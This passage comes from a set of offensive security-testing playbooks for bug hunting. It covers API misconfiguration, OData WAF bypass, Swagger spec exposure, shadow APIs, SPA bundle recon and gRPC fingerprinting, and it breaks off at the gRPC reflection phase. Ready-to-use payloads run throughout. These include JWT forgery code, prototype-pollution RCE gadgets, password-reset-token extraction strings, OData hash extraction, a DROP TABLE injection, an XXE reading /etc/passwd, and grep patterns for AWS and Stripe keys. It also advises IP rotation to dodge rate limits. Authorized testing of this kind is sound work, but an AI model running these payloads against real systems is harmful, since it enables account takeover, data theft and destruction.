- Check all API versions (/v1, /v2, /v3)
- Validate both authenticated and unauthenticated access

**Must Not:**
- Assume same security controls across API versions
- Skip testing undocumented endpoints
- Ignore rate limiting checks

**Should:**
- Add `X-Requested-With: XMLHttpRequest` header to simulate frontend
- Check archive.org for historical API endpoints
- Test for race conditions on sensitive operations

---

## Examples

### Example 1: IDOR Exploitation

```bash
# Original request (own data)
GET /api/v1/invoices/12345
Authorization: Bearer <token>

# Modified request (other user's data)
GET /api/v1/invoices/12346
Authorization: Bearer <token>

# Response reveals other user's invoice data
```

### Example 2: GraphQL Introspection

```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}'
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| API returns nothing | Add `X-Requested-With: XMLHttpRequest` header |
| 401 on all endpoints | Try adding `?user_id=1` parameter |
| GraphQL introspection disabled | Use clairvoyance for schema reconstruction |
| Rate limited | Use IP rotation or batch requests |
| Can't find endpoints | Check Swagger, archive.org, JS files |


---

## api-misconfig

## 12. API SECURITY MISCONFIGURATION

### Mass Assignment
```javascript
User.update(req.body)  // body has {"role": "admin"} → privilege escalation
```

### JWT None Algorithm
```python
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": 1, "role": "admin"}
token = base64(header) + "." + base64(payload) + "."  # no signature
```

### JWT RS256 → HS256 Algorithm Confusion
```python
# Get server's public key from /.well-known/jwks.json
# Sign token with public key as HMAC secret
token = jwt.encode({"sub": "admin", "role": "admin"}, pub_key, algorithm="HS256")
# Server uses RS256 key as HS256 secret → accepts it
```

### Prototype Pollution
```javascript
// Server-side — Node.js merge without protection
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
// URL: ?__proto__[isAdmin]=true&__proto__[role]=superadmin
```

For server-side prototype pollution, hunt for an object merge primitive first, then a sink. Favor
JSON/object update endpoints such as profile, address, preferences, settings, cart, admin job, import,
or webhook configuration. Do not stop at a 200 response to `__proto__`; prove that polluted prototype
state reaches a later operation.

Hunt sequence:

1. **Find an object-update endpoint.** Prefer endpoints that accept many named fields or JSON objects.
   Try both JSON and form encodings when the app accepts forms. Include CSRF/session fields when needed.
2. **Pollute harmless marker properties.** Send variants such as:

```
{"__proto__":{"polluted":"pp-1337"}}
{"constructor":{"prototype":{"polluted":"pp-1337"}}}
__proto__[polluted]=pp-1337
constructor[prototype][polluted]=pp-1337
```

3. **Trigger a separate sink.** After pollution, request account/profile/admin/job/export/search/render
   endpoints and compare with baseline. Strong signals include changed JSON defaults, unexpected fields,
   server errors mentioning object properties, changed job output, template/render errors, or command/job
   behavior changes.
4. **Escalate only through learned sinks.** Candidate properties depend on the sink:

```
{"__proto__":{"json spaces":10}}
{"__proto__":{"status":555}}
{"__proto__":{"isAdmin":true,"role":"admin"}}
{"__proto__":{"shell":"/bin/bash","argv0":"node","NODE_OPTIONS":"--inspect"}}
{"__proto__":{"execArgv":["--eval","process.mainModule.require('child_process').execSync('id')"]}}
```

5. **For exfiltration labs or real impact, prefer non-destructive proof.** If an admin job, diagnostic,
   export, or rendering endpoint consumes polluted defaults, use a marker or environment/secret read only
   when authorized. In production, stop at a controlled marker unless scope explicitly permits data access.

### Server-Side Parameter Pollution in Backend URL / REST URL Construction

Use this when a frontend form or endpoint appears to call a server-side API on your behalf
(password reset, account lookup, profile fetch, product lookup, stock check, search). The bug is not
ordinary client-side query pollution. The server takes your input and interpolates it into a backend
URL path or query string, such as:

```
/api/internal/users/<username>/field/email
/api/users/<id>
/api/users?username=<username>&field=email
```

Hunt sequence:

1. **Find the flow and read the client request.** Fetch the page and any referenced JavaScript. Look
   for form actions, `fetch(...)`, hidden CSRF fields, and the exact parameter name the browser sends.
   If there is a reset/account form, test known usernames first to learn the normal success/error shape.
2. **Determine whether input lands in a backend path or query.** Send URL metacharacters in the input:
   `#`, `?`, `&x=y`, `/`, `../`, and encoded forms `%23`, `%3f`, `%26x=y`, `%2f`, `%2e%2e%2f`.
   Distinct errors such as `Invalid route`, `API definition`, `unsupported field`, or changed returned
   fields mean your value is being interpreted by a server-side URL router, not merely validated as text.
3. **Use path traversal to move inside the server-side URL.** If `username/../other-user` changes the
   referenced account, the input is in a REST path segment. Then try appending route fragments such as
   `/field/email`, `/field/id`, `/field/username`, `/field/passwordResetToken`, and terminate the rest
   of the original backend path with `#` or `%23` when the backend URL parser honors fragments.
4. **Discover API documentation from errors.** When an error says to consult the API definition, probe
   common documentation/spec paths: `/openapi.json`, `/swagger.json`, `/api-docs`, `/api/swagger.json`,
   `/swagger/v1/swagger.json`, `/v3/api-docs`, and path-traversal variants that attempt to reach the
   spec from the vulnerable backend route. A spec or descriptive route error tells you valid resources
   and field names.
5. **Exploit only to prove impact.** For password reset/account lookup flows, the strongest proof is a
   sensitive field such as a reset token or secret for another user, then using that token in the normal
   application flow to complete account takeover. Do not stop at `Invalid route`; use errors as routing
   feedback.

Payload patterns to try, adapted to the observed parameter name:

```
username=administrator%23
username=administrator%3f
username=administrator%2f..%2fvictimuser
username=administrator/../victimuser
username=administrator/field/email%23
username=administrator/field/id%23
username=administrator/field/passwordResetToken%23
username=administrator%2ffield%2fpasswordResetToken%23
```

### CORS Exploitation
```bash
# Test: reflected origin + credentials
curl -s -I -H "Origin: https://evil.com" https://target.com/api/user/me
# If: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true
# → CRITICAL: attacker reads credentialed responses
```

---

## OData $filter / $select / $expand WAF-Blacklist Bypass (2024-2026 surface)

OData (Open Data Protocol) is the query layer behind **SharePoint, Microsoft Dynamics 365 / Power Platform, SAP NetWeaver Gateway / Fiori,** and any ASP.NET WebAPI project using `Microsoft.AspNetCore.OData`. It exposes SQL-shaped query operators (`eq`, `ne`, `and`, `or`, `substringof`, `startswith`, `tolower`, `concat`, `replace`) that look SQL-ish but are NOT SQL — meaning keyword-blacklist WAFs routinely fail open on OData traffic.

### Attack class 1 — Boolean-logic blind extraction via `startswith` / `substringof`

```
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'a')
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'aa')
```

Iterate prefix character-by-character; cardinality of the response (or `@odata.count`) is the boolean oracle that confirms the prefix is correct. No SQLi engine needed, no `'`/`--` characters — the WAF sees only legitimate OData keywords. Extracted Microsoft Dynamics 365 / Power Apps Portals **password hashes, names, emails, addresses, financial data** in Dec 2023; Microsoft patched May 2024. ([Stratus Security writeup](https://www.stratussecurity.com/post/critical-microsoft-365-vulnerability), [The Hacker News coverage Jan 2025](https://thehackernews.com/2025/01/severe-security-flaws-patched-in.html))

### Attack class 2 — `$orderby` / `$select` column-disclosure bypass

```
GET /api/data/v9.0/contacts?$orderby=emailaddress1 desc&$select=fullname
```

`$orderby` accepts column names the user has no `$select` permission for, but the engine still sorts on them — the returned order leaks the protected column. Column-level ACLs are enforced on the projection (`$select`) but NOT on `$orderby` / `$filter` — same protected column, different code path. Second Stratus finding in the same Dynamics 365 disclosure; "more dangerous than the first because it directly returned the data" per Stratus.

### Attack class 3 — `$batch` multipart/mixed → per-request WAF signatures miss sub-operations

```
POST /odata/$batch  Content-Type: multipart/mixed; boundary=batch_1
--batch_1
Content-Type: application/http
GET Users?$filter=1 eq 1 HTTP/1.1
--batch_1--
```

WAFs that scan only the outer request body (or that don't natively parse `multipart/mixed`) skip every inner operation. ModSecurity refused `multipart/mixed` historically ([Issue #3296](https://github.com/owasp-modsecurity/ModSecurity/issues/3296)); F5 added native batch parsing only in Advanced WAF v16.1 ([F5 SAP-Fiori advisory](https://www.f5.com/company/blog/securing-sap-fiori-http-batched-requests-odata-with-f5-advance)). The 2025 WAFFLED paper ([arXiv 2503.10846](https://arxiv.org/html/2503.10846v1)) generalises the parsing-discrepancy bypass class across 5 major WAFs.

### Attack class 4 — Encoded / non-canonical operator → keyword-blacklist bypass

```
GET /api?%24filter=Name%20eq%20'x'%20or%201%20eq%201   # URL-encoded $
GET /api?%2524filter=...                                # double-encoded
GET /Users(1)/$value                                    # path-segment style
```

Mixed-case operators (`Eq`, `EQ`) and obscure ones (`substringof`, `tolower`, `concat`, `replace`) look unlike `SELECT`/`UNION` so SQLi-keyword signatures never fire. WAFs that key on the literal string `$filter` see neither form — but the OData server normalises both before evaluating the predicate. Documented since Kalra Black Hat AD 2012; canonical OData-vs-WAF impedance mismatch. ([OWASP Double Encoding](https://owasp.org/www-community/Double_Encoding))

### Attack class 5 — OData → real SQLi when library passes filter raw

```
$filter=Name eq 'x'); DROP TABLE Users--'
```

Only triggers when the OData layer string-concatenates into SQL instead of using LINQ. Documented in [OData/WebApi Issue #2352](https://github.com/OData/WebApi/issues/2352). The XML-deserialisation variant: **CVE-2019-17554** (Apache Olingo OData 4.0.0-4.6.0, XXE via `<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>` in `application/xml` body, CVSS 7.5). DoS variant: **CVE-2018-8269** (Microsoft.Data.OData deep `$filter` recursion → stack overflow).

### Bonus — `$expand` navigation-property IDOR

```
GET /Orders?$expand=Customer($expand=PaymentMethods($expand=Card))
```

Authorisation decorators applied to top-level entity sets; the engine joins along navigation properties without re-checking ACL on the joined entity. Same root cause as the 2021 PowerApps Portals 38M-record mass leak ([UpGuard writeup](https://www.upguard.com/breaches/power-apps)).

### Detection heuristics

- Response headers: `OData-Version: 4.0` / `DataServiceVersion: 3.0`; URL paths `/_api/`, `/odata/`, `/_vti_bin/`, `/api/data/v9.x/`, `/sap/opu/odata/`.
- Try `$metadata` → if anonymous, the full schema (entity sets, navigation properties, function imports) is yours.
- Probe each entity set with `$filter=1 eq 1`, `$top=1`, `$select=*`, then `$orderby=<column-you-shouldnt-see>` for column-level ACL.
- Send the same payload three ways (`$filter=`, `%24filter=`, `%2524filter=`) and through `$batch` — divergent WAF behaviour confirms the parser-discrepancy bug.

---

## NSwag / Swagger / OpenAPI Spec Exposure (2024-2026 surface)

NSwag is the Swagger/OpenAPI toolchain for ASP.NET Core. Default routes (`/swagger`, `/swagger/v1/swagger.json`, `/swagger/index.html`) ship enabled in many .NET 6/7/8 projects and developers leave them on in production. The exposed spec discloses every endpoint, HTTP methods, parameter names + types + formats + max-lengths, models, validation rules — a complete attack-map in JSON.

### Default discovery paths (cross-references `web2-recon`)

```
# NSwag / Swashbuckle (ASP.NET Core)
/swagger, /swagger/index.html, /swagger/v1/swagger.json, /swagger/v2/swagger.json, /swagger/v3/swagger.json
/swagger-ui, /swagger-ui/, /swagger-ui.html, /api-docs
/nswag, /nswag/index.html, /api/swagger, /api/swagger.json, /api/openapi.json

# Generic OpenAPI
/openapi, /openapi.json, /openapi.yaml, /.well-known/openapi.json

# Java / Spring (Springfox / springdoc)
/v2/api-docs, /v3/api-docs, /v3/api-docs.yaml, /swagger-resources

# Python (FastAPI / Connexion)
/docs, /redoc, /openapi.json

# Quarkus
/q/openapi, /q/swagger-ui

# GraphQL adjacent
/graphql, /graphiql, /playground, /altair, /voyager
```

Tools: `kiterunner` natively eats OpenAPI; `sj` (Swagger Jacker), `apidetector`, `XSSwagger`.

### Attack chains

**A. Spec disclosure → mass IDOR / BOLA.** Spec lists every `GET /api/v1/users/{userId}/...`. `jq '.paths | keys' swagger.json` → swap `{userId}` for victim's ID via Autorize/`ffuf -mc 200`. Common case: spec leaks `/api/admin/users/{id}/reset-password` documented but missing `[Authorize(Roles="Admin")]` on the controller — low-priv ATO.

**B. Spec disclosure → mass-assignment payload construction.** `components.schemas.UserUpdateDto` enumerates every model field including `isAdmin`, `emailVerified`, `tenantId`, `role`. Attacker copies the schema verbatim into `PATCH /users/me` and adds the privileged fields. Server's `[FromBody]` binder accepts them when DTOs aren't split into read-vs-write models.

**C. Hidden endpoints.** Specs document `/internal/*`, `/debug/*`, `/v0/*`, `/legacy/*` routes that no front-end UI references. Reachable but uncovered by WAF rules and often skipped during auth reviews.

**D. Swagger UI configUrl takeover.** Swagger UI loads its config from `?configUrl=`. If unsanitised, attacker hosts an evil OpenAPI spec, sends victim a link to the *legitimate* Swagger UI with `?configUrl=https://evil/spec.json`. Spec routes point back at the legitimate origin so the victim's "Try It Out" clicks fire same-origin authenticated requests. ([HackerOne #3124103 — U.S. DoD Swagger UI Injection, May 2025](https://hackerone.com/reports/3124103))

### Disclosed cases

- **CVE-2018-25031** — Swagger UI ≤ 4.1.2 spec-injection via URL parameter; affects org.webjars:swagger-ui broadly (embedded in Swashbuckle and NSwag bundles).
- **Swagger UI DOM XSS (3.14.1 → 3.38.0)** — outdated bundled DOMPurify + remote-spec-load → arbitrary JS in victim browser ([Vidoc Security Lab writeup](https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers), [PortSwigger Daily Swig](https://portswigger.net/daily-swig/widespread-swagger-ui-library-vulnerability-leads-to-dom-xss-attacks)). Reported live on PayPal, Atlassian, Microsoft, GitLab, Yahoo.
- **HackerOne #3124103** — U.S. Department of Defense, Swagger UI Injection (May 2025).
- **HackerOne #2534300** — Ionity GmbH, HTML injection in Swagger UI.
- **HackerOne #1656650** — Reflected XSS via Swagger UI `url=` parameter.
- **CloudSEK threat-intel (2024)** — actors abuse exposed `swagger-ui` to invoke a verified-business WhatsApp send-message endpoint, impersonating the company to its customers. 6,000+ exposed Swagger UI instances on Shodan at time of writing. ([CloudSEK report](https://www.cloudsek.com/threatintelligence/threat-actors-use-exposed-swagger-ui-to-misuse-a-companys-endpoints-and-target-customers))
- **CVE-2023-38337** — `rswag` (Ruby Swagger toolchain) directory traversal — reminder that the spec endpoint is itself an attack surface.

### Detection checklist

1. httpx-probe every path above across the full subdomain set; flag 200 with `Content-Type: application/json` AND body matching `"swagger"` or `"openapi"`.
2. For every hit: `jq '.paths | keys' swagger.json` → feed to kiterunner / Autorize.
3. `jq '.components.schemas' swagger.json` → mass-assignment field candidates.
4. Banner the Swagger UI HTML for version string; map to the CVE-2018-25031 / DOM-XSS table.
5. Test `?configUrl=` and `?url=` parameter handling on every Swagger UI hit.

---

## Related Skills & Chains

- **`hunt-ato`** — Mass assignment on signup/profile is the fastest path to admin. Chain primitive: API mass assignment + `hunt-ato` → `role=admin` set on signup → ATO via privileged role on first login.
- **`hunt-auth-bypass`** — JWT flaws collapse the entire auth layer. Chain primitive: JWT `alg=none` + `hunt-auth-bypass` → impersonate any user by setting `sub` to victim ID, no signature required.
- **`hunt-rce`** — Prototype pollution gadgets in Node.js dependencies (lodash, mongoose, jQuery) reach `child_process.spawn`. Chain primitive: Prototype pollution (`__proto__.shell=true`) + `hunt-rce` (Node.js gadget chain) → RCE on the API node.
- **`hunt-subdomain`** — CORS regex with wildcard subdomain trusts a takeoverable host. Chain primitive: CORS allowlist `*.target.com` + subdomain takeover → attacker-controlled origin reads credentialed API responses.
- **`security-arsenal`** — Load the JWT Attack Payloads section (alg=none, kid path traversal, JWK injection, embedded JWK) and the Mass-Assignment Field Wordlist (`is_admin`, `role`, `verified`, `permissions`, `org_id`, `tenant_id`).
- **`triage-validation`** — Apply the Server-Policy-vs-State gate: a permissive CORS header alone is informational; demonstrate actual cross-origin credentialed read of sensitive data before reporting.




---

## shadow-api

## OWASP API9 — Improper Inventory Management (Shadow / Zombie APIs)

As an API evolves, old versions and internal/staging routes routinely stay reachable without
receiving the same security fixes as the current version — because nobody tracks that they
still exist. The bug is rarely in one endpoint; it's in the **delta** between what an old
version enforces and what the current version enforces on the same operation.

### When to use

Trigger when:
- Versioned paths are visible (`/v1/`, `/v2/`, `/api/2023-01-01/`) or `Accept`/`X-API-Version`
  headers are in play.
- A changelog, release notes, or deprecation notice references removed/old API behavior.
- A mobile APK/IPA (via `apk-redteam-pipeline` / `ios-redteam-pipeline`) hardcodes endpoints
  that look like an older backend version than the current web app calls.
- Multiple OpenAPI/Swagger specs are discoverable, or `info.version` in one spec implies others
  exist.

DO NOT use for single-version APIs with no version history — there's nothing to diff; go
straight to `hunt-api-misconfig` for direct exploitation of the one surface that exists.

---

## Stage 1 — Enumerate the Full Version Surface

```bash
# Path-based versioning
for v in v1 v2 v3 v4 beta alpha internal legacy old 2022-01-01 2023-01-01 2024-01-01; do
  curl -s -o /dev/null -w "%{http_code} /api/$v/\n" "https://$TARGET/api/$v/"
done

# Header-based versioning
curl -s -H "X-API-Version: 1" https://$TARGET/api/users
curl -s -H "Accept: application/vnd.company.v1+json" https://$TARGET/api/users

# Subdomain-based versioning
for sub in api api-v1 api-v2 apiv1 apiv2 legacy-api old-api internal-api staging-api; do
  curl -s -o /dev/null -w "%{http_code} $sub\n" "https://$sub.$TARGET/"
done
```

A `200`/`401`/`403` on an old version path (anything but `404`/connection-refused) means the
version is still live and worth carrying into Stage 3, even if it demands auth.

---

## Stage 2 — Pull Every Reachable Spec, Not Just the Linked One

```bash
for path in openapi.json swagger.json v1/swagger.json v2/swagger.json v3/api-docs \
            api-docs.json swagger/v1/swagger.json .well-known/openapi.json; do
  curl -s -o /dev/null -w "%{http_code} /$path\n" "https://$TARGET/$path"
done

# Wayback Machine — a DEPRECATED version's spec often stays indexed after the live link is removed
curl -s "http://web.archive.org/cdx/search/cdx?url=$TARGET/*swagger*&output=json&collapse=urlkey"
curl -s "http://web.archive.org/cdx/search/cdx?url=$TARGET/*openapi*&output=json&collapse=urlkey"
```

When more than one spec resolves (a current one and an archived/old one), diff the endpoint
inventories directly:
```bash
jq -r '.paths | keys[]' v1-swagger.json | sort > /tmp/v1_paths.txt
jq -r '.paths | keys[]' v2-swagger.json | sort > /tmp/v2_paths.txt
comm -23 /tmp/v1_paths.txt /tmp/v2_paths.txt   # in v1 only — candidates for "still live but forgotten"
```
For every path in that diff, confirm it's still reachable against the v1 base URL. A route
documented only in the old spec that still returns something other than `404` is a zombie-
endpoint candidate — carry it into Stage 3.

---

## Stage 3 — Behavioral Diff Between Old and Current Version

For each operation that exists in **both** versions, compare security-relevant behavior, not
response shape. Response shape differences are Informational; behavioral security regressions
are the finding.

- **Auth strength.** Does the old version accept no token, an expired token, or a lower-
  privilege token that the current version rejects?
  ```bash
  curl -s -H "Authorization: Bearer $EXPIRED_TOKEN" https://$TARGET/api/v1/users/me -w '\n%{http_code}\n'
  curl -s -H "Authorization: Bearer $EXPIRED_TOKEN" https://$TARGET/api/v2/users/me -w '\n%{http_code}\n'
  ```
- **Rate limiting.** Burst the same number of requests against both versions' equivalent
  endpoint; a missing `429` on the old version means rate-limiting was added later and never
  backported.
- **Input validation.** Send the identical injection/oversized/malformed payload to both; the
  old version accepting what the new one rejects means hardening happened forward-only —
  chain into whichever injection class the payload targets (`hunt-sqli`, `hunt-idor`, etc.).
- **Field exposure.** Does the old version's response body include fields — internal IDs, other
  users' data, internal notes, PII — that the current version has since redacted?

---

## Stage 4 — Deprecated / Internal Routes Never Referenced by the Current UI

- Grep JS bundles for API calls no visible UI flow triggers (`/internal/`, `/admin/`, `/debug/`,
  `/_internal/`, `/test/`, `/staging/`) — reuse `hunt-source-leak`'s JS-bundle grep patterns for
  this specifically.
- Check `robots.txt` / `sitemap.xml` for disallowed API paths — a self-inflicted disclosure.
- Mobile-app endpoint inventories (via `apk-redteam-pipeline` / `ios-redteam-pipeline`) very
  often reference an older backend version than the current web app calls. Treat every
  APK/IPA-sourced endpoint as a version-diff candidate against the live web API.

---

## False-Positive Gate

- A version difference alone (different response shape, cosmetic field renaming) is
  Informational. The finding is a **security-relevant regression** — auth, rate-limit, or
  validation that got weaker going backward in version history.
- Confirm the old endpoint is not simply an alias/proxy to the current implementation before
  claiming a behavioral difference — send a payload that would actually behave differently
  under old vs. new logic, not just compare a version string in the response body.
- A `200` on a path that just serves a static "this API version is deprecated, use v2" message
  is not a finding — confirm the underlying operation still executes.

---

## Severity Table

| Finding | Severity |
|---|---|
| Old version bypasses auth entirely where current version requires it | Critical |
| Old version missing rate-limit present on current version | Medium–High (chain via `hunt-brute-force`) |
| Old version leaks extra fields (PII, internal IDs) vs. current | Medium–High |
| Old version accepts payloads the current version now validates/sanitizes | High (chain to the underlying injection class) |
| Version is reachable but behaviorally identical to current | Informational |

---

## Related Skills & Chains

- **`hunt-api-misconfig`** — owns exploitation once a spec or endpoint is in hand (mass
  assignment, JWT attacks, OData, Swagger-chain attacks). This skill hands it a sharper target:
  "here's a zombie endpoint with weaker validation than the current one."
- **`hunt-subdomain`** — owns host/subdomain-level discovery (`api-v1.target.com` as its own
  host, potential takeover). This skill owns what happens once you're inside a given host's
  version surface.
- **`hunt-source-leak`** — JS-bundle grep for internal/undocumented calls; reused here
  specifically for version-diffing rather than secret extraction.
- **`apk-redteam-pipeline`** / **`ios-redteam-pipeline`** — mobile builds routinely hardcode an
  older API version; every mobile-sourced endpoint is a version-diff candidate.
- **`hunt-brute-force`** — a rate-limit regression found here is only a complete finding once
  chained to actual brute-forceable impact (login, OTP, enumeration).




---

## spa-api

## When to use this skill

Trigger when:
- A target host returns a tiny HTML shell + big `/static/js/*.js` or `/_next/static/*` bundles (React/Vue/Angular/Next/Svelte SPA)
- You see a subdomain named `console`, `app`, `dashboard`, `portal`, `admin`, `panel`, `manage`, `internal`
- Recon surfaces any `*api*`, `*-api*`, `api.*` host
- A login page is OAuth/SSO-gated (the *frontend* auth tells you nothing about whether the *API* enforces auth)

The core insight: **a SPA is a client to a backend API, and it ships the full map of that API — hosts, routes, sometimes keys — to anyone who views source.** The login page being protected says nothing about whether the API behind it checks tokens. Auth is frequently enforced on the *gateway/login* and missing on a *route group* of the API.

DO NOT skip this because "the app needs login" — that's exactly when this pays off.

---

## The play (5 steps)

### 1. Pull the shell + enumerate the bundles
```bash
curl -s https://console.target.com/ -o index.html
# React/CRA:
grep -oE '/static/js/[^"]+\.js' index.html
# Next.js:
grep -oE '/_next/static/[^"]+\.js' index.html
# generic:
grep -oiE 'src="[^"]+\.js[^"]*"' index.html
```
Download every bundle (they can be multi-MB — that's fine, it's all route data):
```bash
mkdir bundles
for j in $(grep -oE '/static/js/[^"]+\.js' index.html | sort -u); do
  curl -s "https://console.target.com$j" -o "bundles/$(echo "$j"|tr '/' '_')"
done
```

### 2. Harvest API hosts, routes, and secrets from the bundles
```bash
B=bundles/*.js
# Backend API hosts (incl. dev/beta/staging variants — often weaker auth)
grep -ohiE 'https://[a-z0-9.-]*(api|console|backend|service)[a-z0-9.-]*\.target\.com[a-z0-9/_-]*' $B | sort -u
# Versioned API base paths
grep -ohiE '/api/v[0-9]+/?' $B | sort -u
# Route literals — minified bundles store routes as STRING segments, not full URLs.
# Grep for quoted "resource/action" strings:
grep -ohiE '"[a-z0-9_-]+/[a-z0-9_/-]+"' $B | tr -d '"' \
  | grep -iE '(login|user|account|order|billing|invoice|payment|deal|report|token|otp|password|reset|admin|profile|auth|upload|export|role|permission|dashboard|wallet|finance|sales)' | sort -u
# Secrets (validate before trusting — most AIza keys are Maps/analytics, not Auth)
grep -ohiE '(AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}|sk_live_[0-9A-Za-z]+|eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}|apiKey["'"'"']?\s*[:=]\s*["'"'"'][^"'"'"']+)' $B | sort -u
```
**Note:** minifiers store routes as concatenated string segments (e.g. `"account/payment/list"`), NOT full `/api/v2/...` URLs — so a naive `/api/v*` grep returns nothing. Grep for the **resource-word route strings** and prepend the base yourself.

**Lazy-loaded (async) chunks — don't stop at HTML-referenced bundles.** CRA/webpack SPAs reference only runtime+main+vendor in index.html; numbered async route chunks are named inside main.js's chunk map and loaded at runtime, so grepping only `/static/js/*.js` from the shell truncates route coverage to eager chunks.
```bash
grep -oE '[0-9]+:"[a-f0-9]+"' bundles/*main*.js        # {chunkId:"hash"} pairs
# reconstruct /static/js/<id>.<hash>.chunk.js, download each, re-run route/host/secret harvest
# asset-manifest.json (if present) lists them all -> hunt-source-leak
```

### 3. Establish a CONTROL — find an endpoint that IS gated
Before declaring anything vulnerable, send an unauthenticated request to an endpoint you expect to be protected, and capture what *correct* rejection looks like:
```bash
curl -s -X POST https://api.target.com/api/users -H 'Content-Type: application/json' -d '{}'
# secure → {"error":"Missing or invalid authorization header"} or HTTP 401
```
This is your differential. A sibling API (e.g. a second API host, or a different route group on the same host) is the ideal control — same stack, so a different response = real authz gap, not a quirk.

### 4. Test each route family UNAUTHENTICATED, both methods
For every discovered route, send it with **no `Authorization` header** and compare to the control:
```bash
for r in <routes>; do
  curl -s -o /tmp/r -w "[%{http_code}] $r\n" -X POST -H 'Content-Type: application/json' -d '{}' "https://api.target.com/api/v2/$r"
done
```
Interpret:
- **`401`/`"Missing authorization"`** → gated (correct). Move on.
- **`200` with data** → unauthenticated data exposure. **Finding.**
- **`400 "field X is mandatory"`** → the route processed your request and reached *business-logic validation* without an auth check → **auth bypass; supply the field minimally to confirm.**
- **`200` + verbose DB/stack error** (e.g. `PROCEDURE db_x.sp_y does not exist`) → reached the data layer unauthenticated; also a SQLi-surface signal.
- **Mandatory fields named like `is_admin` / `is_internal` / `requested_by` / `role_id` / `account_type`** → **authorization derived from client-supplied parameters** — set the privilege flag and you self-elevate. Critical-class.

### 5. Pivot & prove (minimally)
- IDs returned by one endpoint (`account_id`, `order_id`, `deal_id`) are the keys the *other* endpoints consume — they prove the whole router is reachable, not just one route.
- Test `dev-`/`beta-`/`staging-` API variants — they frequently have weaker/disabled auth.
- Check the response headers: `Access-Control-Allow-Origin: *` compounds the issue (any web origin reads it from a victim's browser).
- **STOP at minimum-necessary proof.** A handful of records (or a `totalCount`) confirms the missing check. Do NOT enumerate the table — see `redteam-mindset` data-minimization boundary. The finding is the absent auth, not the data volume.

---

## What "the API behind the SSO login" really means

A common, dangerous architecture:
- `console.target.com` (the SPA) → login is **Entra/Okta/Google OAuth** (looks airtight).
- `api.target.com` (the backend) → some route groups enforce the bearer token, **some route groups forgot the middleware.**

The frontend login is theatre if the API doesn't independently validate the token on every route. Always test the API directly, bare, regardless of how locked-down the login UI is.

---

## Anti-patterns

- **"The app requires login, so the API must be protected."** No — test the API directly, unauthenticated. The whole point.
- **"Minified bundle, can't read it."** You don't need to read it — grep it for hosts/routes/secrets. 5 minutes.
- **"`/api/v1/foo` returned 404, so no API here."** Wrong base or wrong method. Try `/api/`, `/api/v2/`, POST not GET, and the exact route strings from the bundle (Express's 404 echoes the path — use it to calibrate).
- **"AIza key found → critical secret."** Validate first — most are Maps/analytics keys (`CONFIGURATION_NOT_FOUND` on identitytoolkit = not Auth-enabled). Don't over-claim.
- **Dumping the whole dataset once you get a 200.** Stop at PoC. (`redteam-mindset`.)
- **Account-creation / write endpoints as "proof".** Read endpoints prove the auth gap without creating state. Never POST a `create`/`signup`/`upload` to "demonstrate" — that's a destructive write needing explicit per-action authorization.

---

## Related Skills & Chains

- **`hunt-api-misconfig`** — once the API is mapped, run the broader misconfig matrix (method tampering, mass assignment, JWT alg confusion) per route.
- **`hunt-idor`** — the `account_id`/`order_id` pivots feed straight into IDOR testing across discovered routes.
- **`hunt-source-leak`** — sourcemaps (`*.js.map`) reconstruct original source for deeper route/secret extraction; same harvesting muscle.
- **`hunt-nextjs`** — for Next.js targets, layer the middleware-bypass (`x-middleware-subrequest`) and `/_next/data` route tests on top of this.
- **`redteam-mindset`** — the data-minimization boundary governs step 5: prove the missing check, don't exfiltrate the table.
- **`recon-scope-triage`** — verify the API host actually belongs to the target before testing (don't pop a same-named third party's API).




---

## grpc

# HUNT-GRPC — gRPC Security

## Crown Jewel Targets

gRPC reflection enabled = full service catalog enumeration without source code. The highest-value gRPC bugs come from the architectural assumption that a service is "internal" — auth is enforced at the edge proxy, and the backend trusts any caller that reaches it. Once you reach the backend directly (exposed port, SSRF, proxy bypass), that trust collapses.

**Highest-value findings:**
- **Reflection enabled in production** — `grpc.reflection.v1alpha.ServerReflection` / `grpc.reflection.v1.ServerReflection` lists every method, message, and internal service. Enumeration enabler, not a vuln on its own (see Validation).
- **Missing auth on internal service** — a service designed for east-west microservice traffic exposed externally with no mTLS and no per-method authorization → call privileged methods directly.
- **Edge-auth-only / metadata-stripping** — proxy authenticates the user but the backend re-trusts proxy-injected headers (`x-user-id`, `x-tenant-id`, `x-forwarded-*`); if you reach the backend or can inject those headers via the proxy, you impersonate any tenant.
- **Plaintext gRPC** — gRPC h2c (cleartext HTTP/2) on a non-standard port → credential/metadata interception.
- **HTTP/2 Rapid Reset DoS (CVE-2023-44487)** — interleaved HEADERS + immediate RST_STREAM frames bypass `MAX_CONCURRENT_STREAMS` accounting → resource exhaustion. **DoS is in scope on almost no program — get explicit written authorization before sending a single burst.**

---

## Phase 1 — Fingerprint & Port Discovery

```bash
# Common gRPC ports (50051 native; 443/8443 via TLS+ALPN h2; 9090/8080 h2c)
nmap -sV -p 50051,50052,443,9090,8080,8443,6565,9000 $TARGET 2>/dev/null | grep open

# ALPN must negotiate h2 — gRPC cannot run on HTTP/1.1
echo | openssl s_client -alpn h2 -connect $TARGET:443 2>/dev/null | grep -i "ALPN.*h2"

# Native-gRPC fingerprint: an HTTP/2 POST to a bogus method returns a grpc-status
# trailer (12 = UNIMPLEMENTED) even when the path is wrong — strong signal it's gRPC.
curl -s --http2-prior-knowledge -X POST "http://$TARGET:9090/x.Y/Z" \
  -H "content-type: application/grpc" -o /dev/null -D - | grep -i grpc-status

# TLS-fronted h2 (port 443): look for grpc-status trailer / grpc content-type
curl -s --http2 -X POST "https://$TARGET/grpc.health.v1.Health/Check" \
  -H "content-type: application/grpc-web+proto" -o /dev/null -D - | grep -i "grpc-status\|content-type"
```

`grpc-status` trailer present ⇒ a gRPC server (or grpc-gateway/Envoy) is behind that port. `UNIMPLEMENTED` on a random path is normal and only confirms the transport — not a finding.

---

## Phase 2 — Service Enumeration via Reflection

```bash
